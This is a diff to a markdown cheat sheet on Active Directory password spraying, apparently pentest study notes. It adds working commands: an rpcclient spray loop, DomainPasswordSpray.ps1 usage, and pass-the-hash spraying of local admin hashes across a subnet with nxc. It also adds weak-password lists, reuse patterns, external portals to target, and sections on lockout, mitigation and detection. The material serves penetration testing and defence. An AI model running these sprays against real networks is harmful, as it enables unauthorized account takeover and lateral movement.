@@ -121,7 +121,7 @@ This turns a 40–60% hit list into potentially 100% of real accounts — much s
 
 ---
 
-## 4. Step 3 — Spray
+## 4. Step 3 — Spray (from Linux)
 
 **Kerbrute (preferred for stealth — pre-auth spray, no Event 4625; still counts toward lockout, so timing discipline still applies):**
 ```bash
@@ -134,17 +134,99 @@ nxc smb <DC_IP> -u valid_users.txt -p 'Welcome1' --continue-on-success
 ```
 `--continue-on-success` keeps the run going past the first hit instead of stopping, so you collect every valid pair in one pass instead of re-running per account.
 
+**rpcclient one-liner (works even when SMB signing/other restrictions get in nxc's way — good fallback):**
+```bash
+for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP> | grep Authority; done
+```
+A successful login shows `Authority Name:` in the response — that's your filter.
+
+**Validate a hit quickly:**
+```bash
+nxc smb <DC_IP> -u <user> -p '<pass>'
+```
+
 **Common first-round passwords to try** (complexity-compliant, still weak): `Welcome1`, `Password1`, `Summer2026!`, `<CompanyName>123!`, `ChangeMe1` — always tailor to season/year and company name if known (much higher hit rate than generic lists).
 
 ---
 
-## 5. Lockout Math — Don't Be the Pentester Who Locks Out Everyone
+## 5. Spray from Windows (on a domain-joined foothold)
+
+**DomainPasswordSpray.ps1** — if you're authenticated to the domain, it auto-builds the user list from AD, pulls the password policy (FGPP-aware), and automatically drops any account sitting within one attempt of lockout. This is the safest option when you're already on a domain-joined box:
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+If you're on a Windows host but NOT authenticated to the domain, supply your own list with `-UserList valid_users.txt`.
+
+Kerbrute also runs fine from Windows if you'd rather keep one tool across both platforms.
+
+---
+
+## 6. Local Admin Password Reuse (Lateral Spray)
+
+Not just domain accounts — **local administrator password reuse across hosts** is extremely common (gold-image deployments). Worth checking on every engagement even if it's not your main path.
+
+**Spray a known local admin password/hash across a subnet — `--local-auth` is mandatory here:**
+```bash
+nxc smb --local-auth 172.16.5.0/23 -u administrator -H <NTHASH> | grep +
+```
+`--local-auth` makes nxc attempt only ONE login per host using local SAM auth (not domain auth) — this removes lockout risk entirely. **Never omit this flag when spraying a local admin hash across a range**, or you risk a domain-wide lockout instead of a harmless local check.
+
+**Other reuse patterns worth testing manually:**
+- Desktop admin password `$desktop%@admin123` → try `$server%@admin123` on servers
+- Non-standard local admin `bsmith` → check if the password matches domain user `bsmith`
+- Domain user `ajones`'s password → try it on `ajones_adm` if an admin-tier account exists
+- Cross-domain trusts → a cred valid in Domain A may be valid for a similarly-named user in Domain B
+
+Prioritize spraying local admin hashes against high-value hosts (SQL servers, Exchange) — more likely to have privileged sessions/cached creds sitting in memory once you land.
+
+**Noisy technique — not a stealth play.** Still worth flagging in every report even when it's not your path to domain compromise; remediation is **LAPS** (Local Administrator Password Solution — free from Microsoft, rotates a unique local admin password per host).
+
+---
+
+## 7. Lockout Math — Don't Be the Pentester Who Locks Out Everyone
 
 **Formula:** (lockout threshold − 1) attempts per observation window, then wait the full window + a few minutes buffer before the next round.
 
 Example: threshold = 5, window = 30 min → max 3–4 attempts per account every 31+ minutes.
 
-Internal spray (lateral movement) follows the **same math** — getting internal access doesn't remove the lockout risk, it just might make the policy easier to obtain.
+Internal spray (lateral movement) follows the **same math** — getting internal access doesn't remove the lockout risk, it just might make the policy easier to obtain. Local-admin spraying with `--local-auth` is the one case where lockout math doesn't apply, since it's one attempt per host, not repeated attempts against a domain account.
+
+---
+
+## 8. Mitigations (for reporting)
+
+| Technique | Why it helps |
+|---|---|
+| MFA | Biggest single mitigation — though some implementations still leak whether user/pass was valid even if MFA blocks the login, so flag that too |
+| Restrict app access to least privilege | Fewer valid login targets per user reduces spray surface |
+| Separate admin accounts | Limits blast radius if a privileged account's password is sprayed successfully |
+| Network segmentation | Slows/stops lateral movement if attacker lands in one subnet |
+| Password hygiene / passphrase policy + dictionary filter | Blocks `Welcome1`-style garbage from ever being set in the first place |
+| LAPS | Kills local admin password reuse specifically |
+
+---
+
+## 9. Detection (what defenders watch for)
+
+- Spike in **Event ID 4625** (failed logon) across many accounts in a short window — classic SMB/domain-auth spray signature
+- **Event ID 4771** (Kerberos pre-auth failed) — catches LDAP/Kerberos-based spraying that skips SMB entirely (savvier attackers avoid 4625 this way)
+- Many account lockouts clustering in a short period
+- App/server logs showing many login attempts against valid-looking or nonexistent usernames in a tight time window
+
+---
+
+## 10. External Password Spraying (outside this doc's main scope, but know the targets)
+
+Common externally-exposed services worth spraying once you have a username list and no internal foothold yet:
+- Microsoft 365 / Outlook Web Access / Exchange Web Access
+- Skype for Business / Lync Server
+- RDS Web Access portals
+- Citrix / VMware Horizon VDI portals using AD auth
+- VPN portals (Citrix, SonicWall, Fortinet, OpenVPN) using AD auth
+- Custom web apps with AD-backed login
+
+Same lockout math applies — arguably more important externally since you usually can't pull the real password policy ahead of time.
 
 ---
 
@@ -153,3 +235,4 @@ Internal spray (lateral movement) follows the **same math** — getting internal
 - `enum4linux` → `enum4linux-ng` (better parsing, structured JSON/YAML output, actually maintained)
 - `windapsearch` → dropped; `ldapsearch` / `bloodhound-python` cover the same ground more reliably
 - Added FGPP check — commonly overlooked and exactly what CPTS-style labs test, since the "safe" domain-wide policy can lie to you if a stricter per-group policy applies to your actual target
+- Kept `rpcclient` one-liner and `DomainPasswordSpray.ps1` as-is — both still current and still the best tools for their specific jobs (no modern replacement needed)
